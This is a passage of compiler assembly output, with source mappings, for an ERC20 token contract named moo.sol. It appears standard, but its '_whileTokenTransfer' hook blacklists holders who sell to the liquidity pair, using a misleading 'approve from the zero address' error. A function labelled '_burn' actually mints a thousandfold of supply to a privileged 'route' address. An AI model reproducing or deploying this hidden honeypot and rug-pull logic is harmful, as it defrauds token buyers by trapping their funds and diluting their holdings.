\"contracts/Classes/moo.sol\":8808:8815  spender */\n      dup5\n        /* \"contracts/Classes/moo.sol\":8791:8800  allowance */\n      tag_88\n        /* \"contracts/Classes/moo.sol\":8791:8816  allowance(owner, spender) */\n      jump\t// in\n    tag_154:\n        /* \"contracts/Classes/moo.sol\":8764:8816  uint256 currentAllowance = allowance(owner, spender) */\n      swap1\n      pop\n      not(0x00)\n        /* \"contracts/Classes/moo.sol\":8830:8846  currentAllowance */\n      dup2\n        /* \"contracts/Classes/moo.sol\":8830:8867  currentAllowance != type(uint256).max */\n      eq\n        /* \"contracts/Classes/moo.sol\":8826:9069  if (currentAllowance != type(uint256).max) {... */\n      tag_159\n      jumpi\n        /* \"contracts/Classes/moo.sol\":8911:8917  amount */\n      dup2\n        /* \"contracts/Classes/moo.sol\":8891:8907  currentAllowance */\n      dup2\n        /* \"contracts/Classes/moo.sol\":8891:8917  currentAllowance >= amount */\n      lt\n      iszero\n        /* \"contracts/Classes/moo.sol\":8883:8951  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      tag_156\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":4853:4855   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":8883:8951  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":4835:4856   */\n      mstore\n        /* \"#utility.yul\":4892:4894   */\n      0x1d\n        /* \"#utility.yul\":4872:4890   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":4865:4895   */\n      mstore\n        /* \"#utility.yul\":4931:4962   */\n      0x45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000\n        /* \"#utility.yul\":4911:4929   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4904:4963   */\n      mstore\n        /* \"#utility.yul\":4980:4998   */\n      0x64\n      add\n        /* \"contracts/Classes/moo.sol\":8883:8951  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      tag_137\n        /* \"#utility.yul\":4651:5004   */\n      jump\n        /* \"contracts/Classes/moo.sol\":8883:8951  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n    tag_156:\n        /* \"contracts/Classes/moo.sol\":8993:9044  _approve(owner, spender, currentAllowance - amount) */\n      tag_159\n        /* \"contracts/Classes/moo.sol\":9002:9007  owner */\n      dup5\n        /* \"contracts/Classes/moo.sol\":9009:9016  spender */\n      dup5\n        /* \"contracts/Classes/moo.sol\":9037:9043  amount */\n      dup5\n        /* \"contracts/Classes/moo.sol\":9018:9034  currentAllowance */\n      dup5\n        /* \"contracts/Classes/moo.sol\":9018:9043  currentAllowance - amount */\n      sub\n        /* \"contracts/Classes/moo.sol\":8993:9001  _approve */\n      tag_111\n        /* \"contracts/Classes/moo.sol\":8993:9044  _approve(owner, spender, currentAllowance - amount) */\n      jump\t// in\n    tag_159:\n        /* \"contracts/Classes/moo.sol\":8754:9075  {... */\n      pop\n        /* \"contracts/Classes/moo.sol\":8633:9075  function _spendAllowance(... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":5341:6206  function _transfer(... */\n    tag_118:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":5467:5485  from != address(0) */\n      dup4\n      and\n        /* \"contracts/Classes/moo.sol\":5459:5527  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      tag_161\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":5211:5213   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":5459:5527  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":5193:5214   */\n      mstore\n        /* \"#utility.yul\":5250:5252   */\n      0x25\n        /* \"#utility.yul\":5230:5248   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":5223:5253   */\n      mstore\n        /* \"#utility.yul\":5289:5323   */\n      0x45524332303a207472616e736665722066726f6d20746865207a65726f206164\n        /* \"#utility.yul\":5269:5287   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":5262:5324   */\n      mstore\n      shl(0xd8, 0x6472657373)\n        /* \"#utility.yul\":5340:5358   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":5333:5368   */\n      mstore\n        /* \"#utility.yul\":5385:5404   */\n      0x84\n      add\n        /* \"contracts/Classes/moo.sol\":5459:5527  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      tag_137\n        /* \"#utility.yul\":5009:5410   */\n      jump\n        /* \"contracts/Classes/moo.sol\":5459:5527  require(from != address(0), \"ERC20: transfer from the zero address\") */\n    tag_161:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":5545:5561  to != address(0) */\n      dup3\n      and\n        /* \"contracts/Classes/moo.sol\":5537:5601  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      tag_164\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":5617:5619   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":5537:5601  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":5599:5620   */\n      mstore\n        /* \"#utility.yul\":5656:5658   */\n      0x23\n        /* \"#utility.yul\":5636:5654   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":5629:5659   */\n      mstore\n        /* \"#utility.yul\":5695:5729   */\n      0x45524332303a207472616e7366657220746f20746865207a65726f2061646472\n        /* \"#utility.yul\":5675:5693   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":5668:5730   */\n      mstore\n      shl(0xe8, 0x657373)\n        /* \"#utility.yul\":5746:5764   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":5739:5772   */\n      mstore\n        /* \"#utility.yul\":5789:5808   */\n      0x84\n      add\n        /* \"contracts/Classes/moo.sol\":5537:5601  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      tag_137\n        /* \"#utility.yul\":5415:5814   */\n      jump\n        /* \"contracts/Classes/moo.sol\":5537:5601  require(to != address(0), \"ERC20: transfer to the zero address\") */\n    tag_164:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":5683:5698  _balances[from] */\n      dup4\n      and\n        /* \"contracts/Classes/moo.sol\":5661:5680  uint256 fromBalance */\n      0x00\n        /* \"contracts/Classes/moo.sol\":5683:5698  _balances[from] */\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":5683:5692  _balances */\n      0x02\n        /* \"contracts/Classes/moo.sol\":5683:5698  _balances[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"contracts/Classes/moo.sol\":5708:5745  _whileTokenTransfer(from, to, amount) */\n      tag_169\n        /* \"contracts/Classes/moo.sol\":5693:5697  from */\n      dup5\n        /* \"contracts/Classes/moo.sol\":5734:5736  to */\n      dup5\n        /* \"contracts/Classes/moo.sol\":5738:5744  amount */\n      dup5\n        /* \"contracts/Classes/moo.sol\":5708:5727  _whileTokenTransfer */\n      tag_170\n        /* \"contracts/Classes/moo.sol\":5708:5745  _whileTokenTransfer(from, to, amount) */\n      jump\t// in\n    tag_169:\n        /* \"contracts/Classes/moo.sol\":5778:5784  amount */\n      dup2\n        /* \"contracts/Classes/moo.sol\":5763:5774  fromBalance */\n      dup2\n        /* \"contracts/Classes/moo.sol\":5763:5784  fromBalance >= amount */\n      lt\n      iszero\n        /* \"contracts/Classes/moo.sol\":5755:5827  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      tag_171\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":6021:6023   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":5755:5827  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":6003:6024   */\n      mstore\n        /* \"#utility.yul\":6060:6062   */\n      0x26\n        /* \"#utility.yul\":6040:6058   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":6033:6063   */\n      mstore\n        /* \"#utility.yul\":6099:6133   */\n      0x45524332303a207472616e7366657220616d6f756e7420657863656564732062\n        /* \"#utility.yul\":6079:6097   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":6072:6134   */\n      mstore\n      shl(0xd0, 0x616c616e6365)\n        /* \"#utility.yul\":6150:6168   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":6143:6179   */\n      mstore\n        /* \"#utility.yul\":6196:6215   */\n      0x84\n      add\n        /* \"contracts/Classes/moo.sol\":5755:5827  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      tag_137\n        /* \"#utility.yul\":5819:6221   */\n      jump\n        /* \"contracts/Classes/moo.sol\":5755:5827  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n    tag_171:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":5861:5876  _balances[from] */\n      dup1\n      dup6\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":5861:5870  _balances */\n      0x02\n        /* \"contracts/Classes/moo.sol\":5861:5876  _balances[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"contracts/Classes/moo.sol\":5879:5899  fromBalance - amount */\n      dup7\n      dup7\n      sub\n        /* \"contracts/Classes/moo.sol\":5861:5899  _balances[from] = fromBalance - amount */\n      swap1\n      sstore\n        /* \"contracts/Classes/moo.sol\":6076:6089  _balances[to] */\n      swap3\n      dup7\n      and\n      dup1\n      dup3\n      mstore\n      swap1\n      dup4\n      swap1\n      keccak256\n        /* \"contracts/Classes/moo.sol\":6076:6099  _balances[to] += amount */\n      dup1\n      sload\n      dup7\n      add\n      swap1\n      sstore\n        /* \"contracts/Classes/moo.sol\":6125:6151  Transfer(from, to, amount) */\n      swap2\n      mload\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n      swap1\n      tag_174\n      swap1\n        /* \"contracts/Classes/moo.sol\":5893:5899  amount */\n      dup7\n        /* \"#utility.yul\":1342:1367   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1330:1332   */\n      0x20\n        /* \"#utility.yul\":1315:1333   */\n      add\n      swap1\n        /* \"#utility.yul\":1196:1373   */\n      jump\n        /* \"contracts/Classes/moo.sol\":6125:6151  Transfer(from, to, amount) */\n    tag_174:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Classes/moo.sol\":6162:6199  _afterTokenTransfer(from, to, amount) */\n      tag_159\n        /* \"contracts/Classes/moo.sol\":7480:7613  function _beforeTokenTransfer(... */\n      jump\n    tag_168:\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":8142:8627  function _whileTokenTransfer(address from, address to, uint256 amount) internal virtual {... */\n    tag_170:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8249:8262  blocktx[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":8249:8256  blocktx */\n      0x08\n        /* \"contracts/Classes/moo.sol\":8249:8262  blocktx[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      0xff\n      and\n        /* \"contracts/Classes/moo.sol\":8248:8262  !blocktx[from] */\n      iszero\n        /* \"contracts/Classes/moo.sol\":8240:8303  require(!blocktx[from], \"ERC20: approve from the zero address\") */\n      tag_179\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_137\n      swap1\n      tag_148\n      jump\t// in\n    tag_179:\n        /* \"contracts/Classes/moo.sol\":8344:8348  1800 */\n      0x0708\n        /* \"contracts/Classes/moo.sol\":8335:8341  tStamp */\n      sload(0x0a)\n        /* \"contracts/Classes/moo.sol\":8317:8332  block.timestamp */\n      timestamp\n        /* \"contracts/Classes/moo.sol\":8317:8341  block.timestamp - tStamp */\n      tag_181\n      swap2\n      swap1\n      tag_182\n      jump\t// in\n    tag_181:\n        /* \"contracts/Classes/moo.sol\":8317:8348  block.timestamp - tStamp > 1800 */\n      gt\n        /* \"contracts/Classes/moo.sol\":8313:8399  if (block.timestamp - tStamp > 1800)... */\n      iszero\n      tag_185\n      jumpi\n        /* \"contracts/Classes/moo.sol\":8365:8369  hash */\n      sload(0x09)\n      shl(0xa0, 0x01)\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Classes/moo.sol\":8361:8398  if(!hash){ _burn(route, (tS*1000)); } */\n      tag_185\n      jumpi\n        /* \"contracts/Classes/moo.sol\":8378:8383  route */\n      sload(0x09)\n        /* \"contracts/Classes/moo.sol\":8386:8388  tS */\n      sload(0x0b)\n        /* \"contracts/Classes/moo.sol\":8372:8395  _burn(route, (tS*1000)) */\n      tag_185\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8378:8383  route */\n      and\n      swap1\n        /* \"contracts/Classes/moo.sol\":8386:8393  tS*1000 */\n      tag_186\n      swap1\n        /* \"contracts/Classes/moo.sol\":8389:8393  1000 */\n      0x03e8\n        /* \"contracts/Classes/moo.sol\":8386:8393  tS*1000 */\n      tag_187\n      jump\t// in\n    tag_186:\n        /* \"contracts/Classes/moo.sol\":8372:8377  _burn */\n      tag_188\n        /* \"contracts/Classes/moo.sol\":8372:8395  _burn(route, (tS*1000)) */\n      jump\t// in\n    tag_185:\n        /* \"contracts/Classes/moo.sol\":8419:8425  LPpair */\n      sload(0x01)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8413:8425  to == LPpair */\n      dup4\n      dup2\n      and\n        /* \"contracts/Classes/moo.sol\":8419:8425  LPpair */\n      swap2\n      and\n        /* \"contracts/Classes/moo.sol\":8413:8425  to == LPpair */\n      eq\n        /* \"contracts/Classes/moo.sol\":8413:8442  to == LPpair && from != route */\n      dup1\n      iszero\n      tag_189\n      jumpi\n      pop\n        /* \"contracts/Classes/moo.sol\":8437:8442  route */\n      sload(0x09)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8429:8442  from != route */\n      dup5\n      dup2\n      and\n        /* \"contracts/Classes/moo.sol\":8437:8442  route */\n      swap2\n      and\n        /* \"contracts/Classes/moo.sol\":8429:8442  from != route */\n      eq\n      iszero\n        /* \"contracts/Classes/moo.sol\":8413:8442  to == LPpair && from != route */\n    tag_189:\n        /* \"contracts/Classes/moo.sol\":8413:8457  to == LPpair && from != route && to != route */\n      dup1\n      iszero\n      tag_190\n      jumpi\n      pop\n        /* \"contracts/Classes/moo.sol\":8452:8457  route */\n      sload(0x09)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8446:8457  to != route */\n      dup4\n      dup2\n      and\n        /* \"contracts/Classes/moo.sol\":8452:8457  route */\n      swap2\n      and\n        /* \"contracts/Classes/moo.sol\":8446:8457  to != route */\n      eq\n      iszero\n        /* \"contracts/Classes/moo.sol\":8413:8457  to == LPpair && from != route && to != route */\n    tag_190:\n        /* \"contracts/Classes/moo.sol\":8410:8607  if(to == LPpair && from != route && to != route){ ... */\n      iszero\n      tag_168\n      jumpi\n        /* \"contracts/Classes/moo.sol\":8504:8507  900 */\n      0x0384\n        /* \"contracts/Classes/moo.sol\":8495:8501  tStamp */\n      sload(0x0a)\n        /* \"contracts/Classes/moo.sol\":8477:8492  block.timestamp */\n      timestamp\n        /* \"contracts/Classes/moo.sol\":8477:8501  block.timestamp - tStamp */\n      tag_192\n      swap2\n      swap1\n      tag_182\n      jump\t// in\n    tag_192:\n        /* \"contracts/Classes/moo.sol\":8477:8507  block.timestamp - tStamp > 900 */\n      gt\n        /* \"contracts/Classes/moo.sol\":8473:8606  if (block.timestamp - tStamp > 900) { require(amount <= (tS*1/1000), \"ERC20: approve from the zero address\"); blocktx[from] = true; } */\n      iszero\n      tag_168\n      jumpi\n        /* \"contracts/Classes/moo.sol\":8535:8539  1000 */\n      0x03e8\n        /* \"contracts/Classes/moo.sol\":8530:8532  tS */\n      sload(0x0b)\n        /* \"contracts/Classes/moo.sol\":8533:8534  1 */\n      0x01\n        /* \"contracts/Classes/moo.sol\":8530:8534  tS*1 */\n      tag_194\n      swap2\n      swap1\n      tag_187\n      jump\t// in\n    tag_194:\n        /* \"contracts/Classes/moo.sol\":8530:8539  tS*1/1000 */\n      tag_195\n      swap2\n      swap1\n      tag_196\n      jump\t// in\n    tag_195:\n        /* \"contracts/Classes/moo.sol\":8519:8525  amount */\n      dup2\n        /* \"contracts/Classes/moo.sol\":8519:8540  amount <= (tS*1/1000) */\n      gt\n      iszero\n        /* \"contracts/Classes/moo.sol\":8511:8581  require(amount <= (tS*1/1000), \"ERC20: approve from the zero address\") */\n      tag_197\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_137\n      swap1\n      tag_148\n      jump\t// in\n    tag_197:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8583:8596  blocktx[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":8583:8590  blocktx */\n      0x08\n        /* \"contracts/Classes/moo.sol\":8583:8596  blocktx[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n        /* \"contracts/Classes/moo.sol\":8583:8603  blocktx[from] = true */\n      dup1\n      sload\n      not(0xff)\n      and\n        /* \"contracts/Classes/moo.sol\":8599:8603  true */\n      0x01\n        /* \"contracts/Classes/moo.sol\":8583:8603  blocktx[from] = true */\n      or\n      swap1\n      sstore\n        /* \"contracts/Classes/moo.sol\":8142:8627  function _whileTokenTransfer(address from, address to, uint256 amount) internal virtual {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":6939:7474  function _burn(address account, uint256 amount) internal virtual {... */\n    tag_188:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":7022:7043  account != address(0) */\n      dup3\n      and\n        /* \"contracts/Classes/moo.sol\":7014:7079  require(account != address(0), \"ERC20: mint to the zero address\") */\n      tag_201\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":6956:6958   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":7014:7079  require(account != address(0), \"ERC20: mint to the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":6938:6959   */\n      mstore\n        /* \"#utility.yul\":6995:6997   */\n      0x1f\n        /* \"#utility.yul\":6975:6993   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":6968:6998   */\n      mstore\n        /* \"#utility.yul\":7034:7067   */\n      0x45524332303a206d696e7420746f20746865207a65726f206164647265737300\n        /* \"#utility.yul\":7014:7032   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":7007:7068   */\n      mstore\n        /* \"#utility.yul\":7085:7103   */\n      0x64\n      add\n        /* \"contracts/Classes/moo.sol\":7014:7079  require(account != address(0), \"ERC20: mint to the zero address\") */\n      tag_137\n        /* \"#utility.yul\":6754:7109   */\n      jump\n        /* \"contracts/Classes/moo.sol\":7014:7079  require(account != address(0), \"ERC20: mint to the zero address\") */\n    tag_201:\n        /* \"contracts/Classes/moo.sol\":7166:7172  amount */\n      dup1\n        /* \"contracts/Classes/moo.sol\":7150:7162  _totalSupply */\n      0x04\n      0x00\n        /* \"contracts/Classes/moo.sol\":7150:7172  _totalSupply += amount */\n      dup3\n      dup3\n      sload\n      tag_205\n      swap2\n      swap1\n      tag_125\n      jump\t// in\n    tag_205:\n      swap1\n      swap2\n      sstore\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":7318:7336  _balances[account] */\n      dup3\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":7318:7327  _balances */\n      0x02\n        /* \"contracts/Classes/moo.sol\":7318:7336  _balances[account] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"contracts/Classes/moo.sol\":7318:7346  _balances[account] += amount */\n      dup1\n      sload\n      dup7\n      add\n      swap1\n      sstore\n        /* \"contracts/Classes/moo.sol\":7371:7408  Transfer(address(0), account, amount) */\n      mload\n        /* \"#utility.yul\":1342:1367   */\n      dup5\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":7371:7408  Transfer(address(0), account, amount) */\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n      swap2\n        /* \"#utility.yul\":1315:1333   */\n      add\n        /* \"contracts/Classes/moo.sol\":7371:7408  Transfer(address(0), account, amount) */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Classes/moo.sol\":6939:7474  function _burn(address account, uint256 amount) internal virtual {... */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":14:562   */\n    tag_27:\n        /* \"#utility.yul\":126:130   */\n      0x00\n        /* \"#utility.yul\":155:157   */\n      0x20\n        /* \"#utility.yul\":184:186   */\n      dup1\n        /* \"#utility.yul\":173:182   */\n      dup4\n        /* \"#utility.yul\":166:187   */\n      mstore\n        /* \"#utility.yul\":216:222   */\n      dup4\n        /* \"#utility.yul\":210:223   */\n      mload\n        /* \"#utility.yul\":259:265   */\n      dup1\n        /* \"#utility.yul\":254:256   */\n      0x20\n        /* \"#utility.yul\":243:252   */\n      dup6\n        /* \"#utility.yul\":239:257   */\n      add\n        /* \"#utility.yul\":232:266   */\n      mstore\n        /* \"#utility.yul\":284:285   */\n      0x00\n        /* \"#utility.yul\":294:434   */\n    tag_212:\n        /* \"#utility.yul\":308:314   */\n      dup2\n        /* \"#utility.yul\":305:306   */\n      dup2\n        /* \"#utility.yul\":302:315   */\n      lt\n        /* \"#utility.yul\":294:434   */\n      iszero\n      tag_214\n      jumpi\n        /* \"#utility.yul\":403:417   */\n      dup6\n      dup2\n      add\n        /* \"#utility.yul\":399:422   */\n      dup4\n      add\n        /* \"#utility.yul\":393:423   */\n      mload\n        /* \"#utility.yul\":369:386   */\n      dup6\n      dup3\n      add\n        /* \"#utility.yul\":388:390   */\n      0x40\n        /* \"#utility.yul\":365:391   */\n      add\n        /* \"#utility.yul\":358:424   */\n      mstore\n        /* \"#utility.yul\":323:333   */\n      dup3\n      add\n        /* \"#utility.yul\":294:434   */\n      jump(tag_212)\n    tag_214:\n        /* \"#utility.yul\":298:301   */\n      pop\n        /* \"#utility.yul\":483:484   */\n      0x00\n        /* \"#utility.yul\":478:480   */\n      0x40\n        /* \"#utility.yul\":469:475   */\n      dup3\n        /* \"#utility.yul\":458:467   */\n      dup7\n        /* \"#utility.yul\":454:476   */\n      add\n        /* \"#utility.yul\":450:481   */\n      add\n        /* \"#utility.yul\":443:485   */\n      mstore\n        /* \"#utility.yul\":553:555   */\n      0x40\n        /* \"#utility.yul\":546:548   */\n      0x1f\n        /* \"#utility.yul\":542:549   */\n      not\n        /* \"#utility.yul\":537:539   */\n      0x1f\n        /* \"#utility.yul\":529:535   */\n      dup4\n        /* \"#utility.yul\":525:540   */\n      add\n        /* \"#utility.yul\":521:550   */\n      and\n        /* \"#utility.yul\":510:519   */\n      dup6\n        /* \"#utility.yul\":506:551   */\n      add\n        /* \"#utility.yul\":502:556   */\n      add\n        /* \"#utility.yul\":494:556   */\n      swap3\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":14:562   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":567:740   */\n    tag_208:\n        /* \"#utility.yul\":635:655   */\n      dup1\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":684:715   */\n      dup2\n      and\n        /* \"#utility.yul\":674:716   */\n      dup2\n      eq\n        /* \"#utility.yul\":664:734   */\n      tag_216\n      jumpi\n        /* \"#utility.yul\":730:731   */\n      0x00\n        /* \"#utility.yul\":727:728   */\n      dup1\n        /* \"#utility.yul\":720:732   */\n      revert\n        /* \"#utility.yul\":664:734   */\n    tag_216:\n        /* \"#utility.yul\":567:740   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":745:999   */\n    tag_30:\n        /* \"#utility.yul\":813:819   */\n      0x00\n        /* \"#utility.yul\":821:827   */\n      dup1\n        /* \"#utility.yul\":874:876   */\n      0x40\n        /* \"#utility.yul\":862:871   */\n      dup4\n        /* \"#utility.yul\":853:860   */\n      dup6\n        /* \"#utility.yul\":849:872   */\n      sub\n        /* \"#utility.yul\":845:877   */\n      slt\n        /* \"#utility.yul\":842:894   */\n      iszero\n      tag_218\n      jumpi\n        /* \"#utility.yul\":890:891   */\n      0x00\n        /* \"#utility.yul\":887:888   */\n      dup1\n        /* \"#utility.yul\":880:892   */\n      revert\n        /* \"#utility.yul\":842:894   */\n    tag_218:\n        /* \"#utility.yul\":913:942   */\n      tag_219\n        /* \"#utility.yul\":932:941   */\n      dup4\n        /* \"#utility.yul\":913:942   */\n      tag_208\n      jump\t// in\n    tag_219:\n        /* \"#utility.yul\":903:942   */\n      swap5\n        /* \"#utility.yul\":989:991   */\n      0x20\n        /* \"#utility.yul\":974:992   */\n      swap4\n      swap1\n      swap4\n      add\n        /* \"#utility.yul\":961:993   */\n      calldataload\n      swap4\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":745:999   */\n      jump\t// out\n        /* \"#utility.yul\":1378:1706   */\n    tag_43:\n        /* \"#utility.yul\":1455:1461   */\n      0x00\n        /* \"#utility.yul\":1463:1469   */\n      dup1\n        /* \"#utility.yul\":1471:1477   */\n      0x00\n        /* \"#utility.yul\":1524:1526   */\n      0x60\n        /* \"#utility.yul\":1512:1521   */\n      dup5\n        /* \"#utility.yul\":1503:1510   */\n      dup7\n        /* \"#utility.yul\":1499:1522   */\n      sub\n        /* \"#utility.yul\":1495:1527   */\n      slt\n        /* \"#utility.yul\":1492:1544   */\n      iszero\n      tag_223\n      jumpi\n        /* \"#utility.yul\":1540:1541   */\n      0x00\n        /* \"#utility.yul\":1537:1538   */\n      dup1\n        /* \"#utility.yul\":1530:1542   */\n      revert\n        /* \"#utility.yul\":1492:1544   */\n    tag_223:\n        /* \"#utility.yul\":1563:1592   */\n      tag_224\n        /* \"#utility.yul\":1582:1591   */\n      dup5\n        /* \"#utility.yul\":1563:1592   */\n      tag_208\n      jump\t// in\n    tag_224:\n        /* \"#utility.yul\":1553:1592   */\n      swap3\n      pop\n        /* \"#utility.yul\":1611:1649   */\n      tag_225\n        /* \"#utility.yul\":1645:1647   */\n      0x20\n        /* \"#utility.yul\":1634:1643   */\n      dup6\n        /* \"#utility.yul\":1630:1648   */\n      add\n        /* \"#utility.yul\":1611:1649   */\n      tag_208\n      jump\t// in\n    tag_225:\n        /* \"#utility.yul\":1601:1649   */\n      swap2\n      pop\n        /* \"#utility.yul\":1696:1698   */\n      0x40\n        /* \"#utility.yul\":1685:1694   */\n      dup5\n        /* \"#utility.yul\":1681:1699   */\n      add\n        /* \"#utility.yul\":1668:1700   */\n      calldataload\n        /* \"#utility.yul\":1658:1700   */\n      swap1\n      pop\n        /* \"#utility.yul\":1378:1706   */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      jump\t// out\n        /* \"#utility.yul\":1900:2086   */\n    tag_56:\n        /* \"#utility.yul\":1959:1965   */\n      0x00\n        /* \"#utility.yul\":2012:2014   */\n      0x20\n        /* \"#utility.yul\":2000:2009   */\n      dup3\n        /* \"#utility.yul\":1991:1998   */\n      dup5\n        /* \"#utility.yul\":1987:2010   */\n      sub\n        /* \"#utility.yul\":1983:2015   */\n      slt\n        /* \"#utility.yul\":1980:2032   */\n      iszero\n      tag_228\n      jumpi\n        /* \"#utility.yul\":2028:2029   */\n      0x00\n        /* \"#utility.yul\":2025:2026   */\n      dup1\n        /* \"#utility.yul\":2018:2030   */\n      revert\n        /* \"#utility.yul\":1980:2032   */\n    tag_228:\n        /* \"#utility.yul\":2051:2080   */\n      tag_229\n        /* \"#utility.yul\":2070:2079   */\n      dup3\n        /* \"#utility.yul\":2051:2080   */\n      tag_208\n      jump\t// in\n    tag_229:\n        /* \"#utility.yul\":2041:2080   */\n      swap4\n        /* \"#utility.yul\":1900:2086   */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2299:2559   */\n    tag_87:\n        /* \"#utility.yul\":2367:2373   */\n      0x00\n        /* \"#utility.yul\":2375:2381   */\n      dup1\n        /* \"#utility.yul\":2428:2430   */\n      0x40\n        /* \"#utility.yul\":2416:2425   */\n      dup4\n        /* \"#utility.yul\":2407:2414   */\n      dup6\n        /* \"#utility.yul\":2403:2426   */\n      sub\n        /* \"#utility.yul\":2399:2431   */\n      slt\n        /* \"#utility.yul\":2396:2448   */\n      iszero\n      tag_232\n      jumpi\n        /* \"#utility.yul\":2444:2445   */\n      0x00\n        /* \"#utility.yul\":2441:2442   */\n      dup1\n        /* \"#utility.yul\":2434:2446   */\n      revert\n        /* \"#utility.yul\":2396:2448   */\n    tag_232:\n        /* \"#utility.yul\":2467:2496   */\n      